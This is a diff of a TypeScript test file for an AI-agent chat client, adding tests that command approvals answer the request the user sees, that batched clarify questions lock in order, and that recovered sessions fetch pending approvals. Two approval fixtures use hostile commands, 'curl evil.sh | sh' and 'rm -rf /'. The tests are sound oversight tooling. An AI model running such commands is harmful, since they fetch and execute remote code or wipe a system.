@@ -15,7 +15,12 @@ import { flushDeltas } from '@/lib/stream-batch'
 import { routeGatewayEvent as handleGatewayEvent } from '@/store/event-router'
 import { requestGateway } from '@/store/gateway'
 import { $petActivity } from '@/store/pet'
-import { $activeSessionAwaitingInput, sessionApprovalRequest, sessionClarifyRequest } from '@/store/prompts'
+import {
+  $activeSessionAwaitingInput,
+  clearAllPrompts,
+  sessionApprovalRequest,
+  sessionClarifyRequest
+} from '@/store/prompts'
 import { $sessionStates, newDraftKey, rekeySession, updateSession } from '@/store/session-state-types'
 import { $subagentsBySession } from '@/store/subagents'
 import { beginTurn, getInflightTurn } from '@/store/turn-lifecycle'
@@ -49,6 +54,7 @@ import {
   resetChat,
   respondApproval,
   respondClarify,
+  respondClarifyBatch,
   respondSecret,
   respondSudo,
   restoreToMessage,
@@ -65,6 +71,10 @@ const messageText = (message: ChatMessage): string =>
 beforeEach(() => {
   resetSessionStates()
   resetChat()
+  // `resetChat` does not touch the per-session prompt stores, so a test that
+  // deliberately leaves a prompt parked (a failed send, a partly-locked batch)
+  // used to hand it to whichever test ran next.
+  clearAllPrompts()
   // Most of these tests drive the reducer directly, so give the active session a
   // real key: the router FAILS CLOSED on unknown sessions, and unscoped events
   // resolve to whatever `$activeSessionKey` names.
@@ -221,6 +231,37 @@ describe('chat reducer (parts model)', () => {
     expect($approval.get()).toMatchObject({ choices: ['once', 'deny'], smartDenied: true })
   })
 
+  /**
+   * MJXHRM-458. `resolve_gateway_approval` answers the OLDEST queued approval
+   * when the call carries no `request_id`, while the bar shows the newest (each
+   * `approval.request` overwrites the session's slot) — so a session holding
+   * two different commands approved the one the user was not looking at.
+   */
+  it('answers the approval the bar is actually showing', async () => {
+    handleGatewayEvent(ev('approval.request', { command: 'curl evil.sh | sh', request_id: 'a1' }))
+    handleGatewayEvent(ev('approval.request', { command: 'rm -rf /', request_id: 'a2' }))
+    vi.mocked(requestGateway).mockClear()
+    await respondApproval('deny')
+
+    expect(vi.mocked(requestGateway).mock.calls[0]).toEqual([
+      'approval.respond',
+      { choice: 'deny', session_id: 'runtime-1', request_id: 'a2' }
+    ])
+  })
+
+  // A gateway too old to send one gets the historical FIFO call, not a
+  // `request_id: undefined` that would match no queued entry at all.
+  it('omits the request_id when the gateway never sent one', async () => {
+    handleGatewayEvent(ev('approval.request', { command: 'rm -rf /' }))
+    vi.mocked(requestGateway).mockClear()
+    await respondApproval('once')
+
+    expect(vi.mocked(requestGateway).mock.calls[0]).toEqual([
+      'approval.respond',
+      { choice: 'once', session_id: 'runtime-1' }
+    ])
+  })
+
   it('respondClarify posts clarify.respond with the request_id + answer and clears the atom', async () => {
     handleGatewayEvent(ev('clarify.request', { request_id: 'c9', question: 'which?', choices: ['x'] }))
     await respondClarify('x')
@@ -253,6 +294,87 @@ describe('chat reducer (parts model)', () => {
     vi.mocked(requestGateway).mockResolvedValueOnce({ status: 'ok' } as never)
 
     await expect(respondClarify('x')).resolves.toBe('delivered')
+  })
+
+  /**
+   * MJXHRM-458. A batch is completed by the lock that empties `remaining`
+   * (`ev.set()` in `_respond`), so the locks are sequential by contract, not by
+   * taste — a reordered burst can complete the batch while an earlier answer is
+   * still in flight, and the tool then reports a blank for a question the user
+   * did answer.
+   */
+  describe('respondClarifyBatch', () => {
+    const raiseBatch = (requestId = 'b1') =>
+      handleGatewayEvent(
+        ev('clarify.request', {
+          request_id: requestId,
+          questions: [
+            { qid: 'q0', question: 'Drink?', choices: ['Coffee', 'Tea'] },
+            { qid: 'q1', question: 'Time?', choices: ['Morning', 'Night'] }
+          ]
+        })
+      )
+
+    it('locks every question by its own question_id, in order', async () => {
+      raiseBatch()
+      // The gateway answers with what is STILL open, so the first reply
+      // disagrees with "the batch is done" — a fixture that said `remaining: []`
+      // twice would pass even if the code never read the field.
+      vi.mocked(requestGateway)
+        .mockResolvedValueOnce({ status: 'ok', remaining: ['q1'] } as never)
+        .mockResolvedValueOnce({ status: 'ok', remaining: [] } as never)
+
+      const result = await respondClarifyBatch([
+        { questionId: 'q0', answer: 'Coffee' },
+        { questionId: 'q1', answer: 'Night' }
+      ])
+
+      const clarifyCalls = vi.mocked(requestGateway).mock.calls.filter(call => call[0] === 'clarify.respond')
+
+      expect(clarifyCalls).toEqual([
+        ['clarify.respond', { request_id: 'b1', question_id: 'q0', answer: 'Coffee' }],
+        ['clarify.respond', { request_id: 'b1', question_id: 'q1', answer: 'Night' }]
+      ])
+      expect(result).toEqual({ outcome: 'delivered', remaining: [] })
+      expect($clarify.get()).toBeNull()
+    })
+
+    // The card stays up on a partial lock: the locks it DID land are
+    // update-in-place server-side, so retrying is safe — but only if the
+    // request is still there to retry from.
+    it('keeps the request when questions are still open', async () => {
+      raiseBatch('b2')
+      vi.mocked(requestGateway).mockResolvedValueOnce({ status: 'ok', remaining: ['q1'] } as never)
+
+      const result = await respondClarifyBatch([{ questionId: 'q0', answer: 'Tea' }])
+
+      expect(result).toEqual({ outcome: 'delivered', remaining: ['q1'] })
+      expect($clarify.get()).toMatchObject({ requestId: 'b2' })
+    })
+
+    // `clarify.respond` is `allow_expired`: the whole request is gone, so the
+    // locks after this one would all answer the same way.
+    it('stops locking and reports expired once the batch has timed out', async () => {
+      raiseBatch('b3')
+      vi.mocked(requestGateway).mockResolvedValueOnce({ status: 'expired' } as never)
+
+      const result = await respondClarifyBatch([
+        { questionId: 'q0', answer: 'Coffee' },
+        { questionId: 'q1', answer: 'Night' }
+      ])
+
+      expect(result.outcome).toBe('expired')
+      expect(vi.mocked(requestGateway).mock.calls.filter(call => call[0] === 'clarify.respond')).toHaveLength(1)
+      expect($clarify.get()).toBeNull()
+    })
+
+    it('surfaces a rejected lock instead of clearing the card', async () => {
+      raiseBatch('b4')
+      vi.mocked(requestGateway).mockRejectedValueOnce(new Error('unknown question_id'))
+
+      await expect(respondClarifyBatch([{ questionId: 'nope', answer: 'x' }])).rejects.toThrow('unknown question_id')
+      expect($clarify.get()).toMatchObject({ requestId: 'b4' })
+    })
   })
 
   it('respondSudo posts sudo.respond with the request_id + password and clears the atom', async () => {
@@ -1641,9 +1763,14 @@ describe('stale-runtime recovery', () => {
     expect(vi.mocked(requestGateway).mock.calls.map(call => call[0])).toEqual([
       'approval.respond',
       'session.resume',
-      'approval.respond'
+      'approval.respond',
+      // The queue can hold more than one; the pull that surfaces the next has
+      // to use the RECOVERED runtime too, or it asks a session id the gateway
+      // dropped under it and the leftover approval stays invisible.
+      'approval.pending'
     ])
     expect(vi.mocked(requestGateway).mock.calls[2][1]).toMatchObject({ session_id: 'runtime-2' })
+    expect(vi.mocked(requestGateway).mock.calls[3][1]).toEqual({ session_id: 'runtime-2' })
     // `$approval` reads the ACTIVE key, which the rekey moved too — so this is
     // the bar the user is looking at, not a stale projection.
     expect($approval.get()).toBeNull()
